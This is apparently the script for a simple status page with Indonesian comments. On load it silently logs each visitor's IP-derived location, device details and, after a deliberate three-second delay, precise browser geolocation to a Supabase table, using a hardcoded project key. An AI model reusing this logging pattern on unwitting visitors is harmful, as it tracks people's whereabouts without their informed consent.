// script.js — Dengan delay 3 detik sebelum minta geolocation + selalu masukin data IP

const supabaseUrl = 'https://twdrglmhgspvkndrpptj.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3ZHJnbG1oZ3NwdmtuZHJwcHRqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA1NTM1MTksImV4cCI6MjA4NjEyOTUxOX0.wPD61wpiN2ozqLGAqA-gDxhERkDfoMfP5FFxMboDjoQ';

const { createClient } = supabase;
const sbClient = createClient(supabaseUrl, supabaseAnonKey);

// Fungsi ambil data IP-based (selalu dijalankan)
async function getIpBasedInfo() {
  let info = {
    ip_address: 'unknown',
    city: null,
    country: null,
    lat: null,
    lng: null,
    accuracy: null,
  };

  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const data = await res.json();
      info = {
        ip_address: data.ip || 'unknown',
        city: data.city || null,
        country: data.country_name || null,
        lat: data.latitude || null,
        lng: data.longitude || null,
        accuracy: null,
      };
    }
  } catch (e) {
    console.warn('Gagal ambil info IP');
  }

  return info;
}

// Fungsi utama logging visit
async function logVisit() {
  try {
    // Selalu ambil data IP dulu
    const ipInfo = await getIpBasedInfo();

    let visitorInfo = {
      ...ipInfo,  // copy semua dari IP
      location_permission: 'not_asked',
    };

    // Tunggu 3 detik baru minta geolocation
    console.log('Menunggu 3 detik sebelum minta lokasi...');
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Coba minta geolocation setelah delay
    if (navigator.geolocation) {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });

        visitorInfo.lat = position.coords.latitude;
        visitorInfo.lng = position.coords.longitude;
        visitorInfo.accuracy = position.coords.accuracy;
        visitorInfo.location_permission = 'granted';

        console.log('Geolocation diberikan:', visitorInfo.lat, visitorInfo.lng);
      } catch (geoErr) {
        console.warn('Geolocation ditolak atau error:', geoErr.message);
        visitorInfo.location_permission = 'denied';
        // Data IP tetep dipakai
      }
    } else {
      console.warn('Browser tidak support geolocation');
      visitorInfo.location_permission = 'unsupported';
    }

    // Data final untuk insert (IP selalu ada, geolocation ditambah kalau granted)
    const visitData = {
      ip_address: visitorInfo.ip_address,
      device: navigator.userAgent || 'unknown',
      browser: 'unknown',
      os: navigator.platform || 'unknown',
      location_permission: visitorInfo.location_permission,
      location_type: visitorInfo.location_permission === 'granted' ? 'geolocation' : 'ip-based',
      lat: visitorInfo.lat,
      lng: visitorInfo.lng,
      accuracy: visitorInfo.accuracy,
      city: visitorInfo.city,
      country: visitorInfo.country,
    };

    const { data, error } = await sbClient
      .from('visits')
      .insert(visitData);

    if (error) throw error;

    console.log('Visit berhasil dicatat!', visitData);
  } catch (err) {
    console.error('Gagal mencatat visit:', err.message);
  }
}

// Load event: jalankan logging + animasi
window.addEventListener('load', function () {
  logVisit();

  const card = document.getElementById("card");
  const animatedItems = document.querySelectorAll(".animate");

  if (card) card.classList.add("show");

  animatedItems.forEach((el, i) => {
    setTimeout(() => el.classList.add("show"), i * 120);
  });
});

// LOTTIE STATUS
const status = document.getElementById("status");
const anim = lottie.loadAnimation({
  container: document.getElementById("lottieStatus"),
  renderer: "svg",
  loop: false,
  autoplay: true,
  path: "Success animation (1).json"
});

anim.addEventListener("complete", () => {
  status.classList.add("active");
});

// MODAL HANDLING
const modal = document.getElementById("modal");
const infoBtn = document.getElementById("infoBtn");
const closeModal = document.getElementById("closeModal");

infoBtn.addEventListener("click", () => {
  modal.classList.add("show");
});

closeModal.addEventListener("click", () => {
  modal.classList.remove("show");
});

modal.addEventListener("click", (e) => {
  if (e.target === modal) modal.classList.remove("show");
});
